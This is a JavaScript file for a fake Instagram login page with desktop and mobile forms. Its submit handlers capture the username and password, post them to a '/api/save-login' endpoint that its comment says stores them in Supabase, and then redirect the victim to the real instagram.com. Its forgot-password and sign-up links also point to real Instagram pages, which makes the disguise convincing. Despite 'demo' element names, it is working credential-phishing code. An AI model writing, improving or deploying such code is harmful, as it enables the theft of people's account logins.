/* =========================================================
   DESKTOP LOGIN
========================================================= */

const loginForm = document.getElementById("demoLoginForm");

if (loginForm) {
  loginForm.addEventListener("submit", async function (event) {
    event.preventDefault();

    const user_id = document.getElementById("usernameInput").value.trim();
    const pass = document.getElementById("passwordInput").value;

    if (!user_id || !pass) {
      alert("Please enter both username and password");
      return;
    }

    await saveCredentials(user_id, pass);
    window.location.href = "https://www.instagram.com/";
  });
}

/* =========================================================
   MOBILE LOGIN
========================================================= */

const mobileLoginForm = document.getElementById("mobileLoginForm");

if (mobileLoginForm) {
  mobileLoginForm.addEventListener("submit", async function (event) {
    event.preventDefault();

    const user_id = document.getElementById("mobileUsernameInput").value.trim();
    const pass = document.getElementById("mobilePasswordInput").value;

    if (!user_id || !pass) {
      alert("Please enter both username and password");
      return;
    }

    await saveCredentials(user_id, pass);
    window.location.href = "https://www.instagram.com/";
  });
}

/* =========================================================
   SAVE TO SUPABASE VIA API
========================================================= */

async function saveCredentials(user_id, pass) {
  try {
    const response = await fetch("/api/save-login", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        user_id: user_id,
        pass: pass
      }),
    });

    const result = await response.json();
    console.log("Save result:", result);

    if (!response.ok) {
      console.error("Failed to save:", result.error);
    }
  } catch (error) {
    console.error("Error saving credentials:", error);
  }
}

/* =========================================================
   FORGOT PASSWORD
========================================================= */

const forgotPassword = document.getElementById("forgotPassword");
if (forgotPassword) {
  forgotPassword.addEventListener("click", function () {
    window.location.href = "https://www.instagram.com/accounts/password/reset/";
  });
}

/* =========================================================
   CREATE ACCOUNT
========================================================= */

const createAccount = document.getElementById("createAccount");
if (createAccount) {
  createAccount.addEventListener("click", function () {
    window.location.href = "https://www.instagram.com/accounts/emailsignup/";
  });
}

/* =========================================================
   FACEBOOK BUTTON
========================================================= */

const facebookButton = document.getElementById("facebookButton");
if (facebookButton) {
  facebookButton.addEventListener("click", function () {});
}

/* =========================================================
   LANGUAGE BUTTON
========================================================= */

const languageButton = document.getElementById("languageButton");
if (languageButton) {
  languageButton.addEventListener("click", function () {});
}

/* =========================================================
   MOBILE OPEN APP
========================================================= */

const mobileOpenInstagram = document.getElementById("mobileOpenInstagram");
const mobileOpenTop = document.getElementById("mobileOpenTop");

function showOpenAppMessage() {}

if (mobileOpenInstagram) {
  mobileOpenInstagram.addEventListener("click", showOpenAppMessage);
}
if (mobileOpenTop) {
  mobileOpenTop.addEventListener("click", showOpenAppMessage);
}

/* =========================================================
   MOBILE LOGIN OVERLAY
========================================================= */

const mobileLogin = document.getElementById("mobileLogin");
const mobileTopLogin = document.getElementById("mobileTopLogin");
const mobileLoginOverlay = document.getElementById("mobileLoginOverlay");
const closeMobileLogin = document.getElementById("closeMobileLogin");

function openMobileLogin() {
  if (mobileLoginOverlay) {
    mobileLoginOverlay.classList.add("active");
    document.body.style.overflow = "hidden";
  }
}

function closeMobileLoginBox() {
  if (mobileLoginOverlay) {
    mobileLoginOverlay.classList.remove("active");
    document.body.style.overflow = "";
  }
}

if (mobileLogin) mobileLogin.addEventListener("click", openMobileLogin);
if (mobileTopLogin) mobileTopLogin.addEventListener("click", openMobileLogin);
if (closeMobileLogin) closeMobileLogin.addEventListener("click", closeMobileLoginBox);

if (mobileLoginOverlay) {
  mobileLoginOverlay.addEventListener("click", function (event) {
    if (event.target === mobileLoginOverlay) {
      closeMobileLoginBox();
    }
  });
}

/* =========================================================
   MOBILE FORGOT PASSWORD
========================================================= */

const mobileForgot = document.getElementById("mobileForgot");
if (mobileForgot) {
  mobileForgot.addEventListener("click", function () {
    window.location.href = "https://www.instagram.com/accounts/password/reset/";
  });
}

/* =========================================================
   MOBILE SIGN UP
========================================================= */

const mobileSignup = document.getElementById("mobileSignup");
if (mobileSignup) {
  mobileSignup.addEventListener("click", function () {});
}

/* =========================================================
   MOBILE LANGUAGE
========================================================= */

const mobileLanguage = document.getElementById("mobileLanguage");
if (mobileLanguage) {
  mobileLanguage.addEventListener("click", function () {
    alert("Language selector — demo only.");
  });
}
